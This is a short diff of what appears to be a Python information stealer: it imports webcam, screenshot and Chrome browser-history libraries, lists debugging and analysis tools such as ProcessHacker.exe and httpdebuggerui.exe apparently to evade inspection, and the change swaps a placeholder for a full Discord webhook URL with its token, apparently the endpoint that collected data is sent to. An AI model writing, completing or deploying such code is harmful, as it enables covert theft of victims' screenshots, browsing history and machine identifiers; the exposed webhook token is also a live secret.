@@ -4,7 +4,7 @@ import cv2
 import re, uuid
 from PIL import ImageGrab
 from browser_history.browsers import Chrome
-webhook = "Webhooksss"
+webhook = "https://discord.com/api/webhooks/1347014269916414052/JnNhVeU2yHkC2xSuoLMM4jmiIx3QJx27M9pNyUJ_6LGsZPU8hBPtRfDWrUzsAcC4262M"
 process = [
     "ProcessHacker.exe",
     "httpdebuggerui.exe",
